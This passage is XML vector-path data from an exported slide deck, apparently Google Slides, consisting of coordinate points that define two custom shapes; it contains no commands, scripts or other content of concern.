                    <a:pt x="4182" y="1505"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3888" y="1541"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3595" y="1651"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3338" y="1798"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3081" y="1945"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2861" y="2091"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2641" y="2312"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2421" y="2532"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2238" y="2788"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2091" y="3082"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1981" y="3155"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1834" y="3229"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1504" y="3375"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1211" y="3559"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="954" y="3779"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="697" y="3999"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="477" y="4256"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="330" y="4512"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="183" y="4769"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="73" y="5063"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="37" y="5319"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="0" y="5613"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="0" y="5906"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="73" y="6200"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="183" y="6493"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="294" y="6713"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="440" y="6933"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="660" y="7117"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="880" y="7300"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1064" y="7374"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1027" y="7594"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1027" y="7814"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1064" y="8034"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1101" y="8217"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1174" y="8437"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1284" y="8621"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1431" y="8804"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1614" y="8988"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1797" y="9098"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1981" y="9208"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2201" y="9281"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2421" y="9318"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2641" y="9354"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2861" y="9318"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3081" y="9281"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3301" y="9208"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3375" y="9354"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3448" y="9501"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3595" y="9648"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3742" y="9758"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3925" y="9868"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4108" y="9905"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4292" y="9941"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4475" y="9941"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4842" y="9905"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5246" y="9795"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5686" y="9648"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6163" y="9574"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6603" y="9574"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7080" y="9611"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7446" y="9648"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7630" y="9648"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7813" y="9611"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7960" y="9721"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8143" y="9795"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8327" y="9831"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8547" y="9868"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9024" y="9905"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9391" y="9868"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9501" y="9868"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9354" y="10161"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9317" y="10308"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9281" y="10492"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9317" y="10638"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9354" y="10785"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9464" y="11078"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9647" y="11335"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9831" y="11519"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9977" y="11629"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10198" y="11739"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10381" y="11812"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10821" y="11922"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11298" y="11959"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11775" y="11922"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12215" y="11885"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="13095" y="11775"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="13939" y="11665"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="14343" y="11555"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="14746" y="11409"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="15076" y="11262"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="15370" y="11042"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="15626" y="10785"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="15847" y="10528"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="16030" y="10235"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="16213" y="9941"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="16360" y="9648"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="16433" y="9318"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="16507" y="8988"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="16543" y="8657"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="16507" y="8327"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="16470" y="7997"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="16690" y="7447"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="16837" y="6933"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="16910" y="6347"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="16910" y="5796"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="16837" y="5429"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="16727" y="5063"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="16654" y="4916"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="16543" y="4769"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="16397" y="4659"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="16250" y="4586"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="16250" y="4146"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="16177" y="3742"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="16030" y="3375"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="15773" y="3009"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="15626" y="2825"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="15443" y="2642"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="15223" y="2495"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="15003" y="2385"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="14746" y="2238"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="14526" y="2055"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="14379" y="1835"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="14233" y="1578"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="14123" y="1358"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="13976" y="1138"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="13829" y="991"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="13682" y="808"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="13499" y="698"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="13279" y="588"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="13059" y="514"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12802" y="441"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12362" y="441"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11885" y="477"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11408" y="588"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10968" y="698"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10821" y="514"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10601" y="331"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10381" y="221"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10124" y="147"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9867" y="74"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9574" y="37"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9060"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19" name="Google Shape;319;p5"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="7121425" y="2437925"/>
              <a:ext cx="246700" cy="315500"/>
            </a:xfrm>
            <a:custGeom>
              <a:avLst/>
              <a:gdLst/>
              <a:ahLst/>
              <a:cxnLst/>
              <a:rect l="l" t="t" r="r" b="b"/>
              <a:pathLst>
                <a:path w="9868" h="12620" extrusionOk="0">
                  <a:moveTo>
                    <a:pt x="4182" y="661"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="4182" y="918"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4182" y="1431"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4145" y="2202"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3925" y="2165"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3962" y="2018"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3962" y="1835"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3889" y="1468"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3852" y="1101"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3889" y="918"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3962" y="771"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3999" y="698"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4072" y="661"/>
                  </a:lnTo>
                  <a:close/>
                  <a:moveTo>
                    <a:pt x="1541" y="404"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="1578" y="441"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1614" y="514"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1614" y="1138"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1688" y="2202"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1284" y="2238"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1211" y="2238"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1211" y="1871"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1174" y="1505"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1211" y="1211"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1248" y="954"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1358" y="404"/>
                  </a:lnTo>
                  <a:close/>
                  <a:moveTo>
                    <a:pt x="3815" y="2678"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="4439" y="2715"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5026" y="2789"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5026" y="2825"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5136" y="3485"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3925" y="3559"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2678" y="3632"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1358" y="3669"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="917" y="3706"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="477" y="3742"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="441" y="3229"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="441" y="2972"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="404" y="2862"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="331" y="2752"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="587" y="2789"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="807" y="2789"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1284" y="2752"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1945" y="2678"/>
                  </a:lnTo>
                  <a:close/>
                  <a:moveTo>
                    <a:pt x="4916" y="3999"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="4989" y="4072"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5136" y="4109"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5209" y="4072"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5246" y="4623"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5209" y="5173"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5173" y="5430"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5099" y="5723"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4989" y="5980"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4806" y="6200"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4659" y="6310"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4476" y="6420"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4292" y="6457"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4072" y="6493"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3632" y="6530"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3265" y="6567"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2605" y="6567"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2642" y="6493"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2678" y="6383"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2788" y="6310"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2825" y="6273"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2825" y="6237"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2788" y="6200"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2715" y="6200"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2605" y="6237"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2458" y="6310"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2348" y="6420"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2311" y="6567"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1724" y="6493"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1541" y="6457"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1688" y="6420"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2055" y="6383"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2201" y="6310"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2275" y="6237"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2311" y="6163"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2311" y="6090"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2275" y="6016"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2238" y="5980"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2201" y="5943"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2055" y="5943"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1981" y="6016"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1798" y="6053"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1394" y="6127"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1138" y="6200"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="917" y="6273"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="807" y="6200"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="697" y="6127"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="661" y="5980"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="624" y="5870"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="624" y="5870"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="844" y="5906"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1504" y="5906"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1724" y="5870"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1945" y="5833"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1981" y="5796"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2018" y="5760"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2055" y="5650"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1981" y="5540"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1945" y="5503"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1504" y="5503"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1101" y="5540"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="844" y="5576"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="587" y="5576"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="587" y="5356"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="734" y="5430"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="881" y="5466"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1211" y="5466"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1541" y="5393"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1835" y="5246"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1871" y="5173"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1908" y="5099"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1908" y="5026"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1871" y="4953"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1835" y="4916"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1761" y="4879"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1724" y="4879"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1614" y="4916"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1358" y="5026"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1101" y="5099"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="844" y="5099"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="551" y="5063"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="551" y="4916"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="844" y="4879"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1138" y="4879"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1724" y="4769"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1908" y="4696"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2091" y="4586"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2128" y="4513"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2165" y="4439"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2128" y="4329"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2055" y="4256"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1945" y="4182"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1871" y="4182"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1835" y="4219"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1761" y="4256"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1724" y="4329"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1468" y="4403"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="991" y="4476"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="551" y="4586"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="514" y="4146"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1358" y="4146"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2678" y="4109"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3815" y="4072"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4916" y="3999"/>
                  </a:lnTo>
                  <a:close/>
                  <a:moveTo>
                    <a:pt x="1211" y="1"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="1101" y="37"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1028" y="147"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="881" y="771"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="807" y="1395"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="807" y="1835"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="807" y="2092"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="881" y="2312"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="551" y="2385"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="367" y="2458"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="221" y="2568"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="184" y="2605"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="147" y="2678"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="37" y="2825"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="37" y="3009"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="37" y="3375"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="37" y="3852"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="37" y="3889"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="0" y="3962"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="37" y="4072"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="74" y="4439"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="110" y="5540"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="110" y="5943"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="184" y="6127"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="257" y="6310"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="367" y="6457"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="477" y="6567"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="624" y="6677"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="771" y="6750"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1101" y="6860"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1468" y="6934"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2091" y="7007"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2678" y="7044"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2605" y="7264"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2605" y="7484"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2605" y="7887"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2605" y="8548"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2678" y="9208"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2825" y="10455"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3045" y="11665"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3118" y="11922"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3228" y="12106"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3375" y="12252"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3595" y="12399"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3779" y="12472"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3999" y="12546"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4476" y="12619"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4732" y="12582"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4952" y="12509"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5136" y="12399"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5283" y="12216"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5429" y="12032"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5503" y="11812"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5576" y="11592"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5613" y="11372"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5613" y="11079"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5613" y="10785"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5539" y="10162"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5539" y="9538"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5649" y="8951"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5723" y="8658"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5833" y="8364"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5980" y="8071"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6090" y="7961"/>
                  </a:lnTo>
                  <a:lnTo>
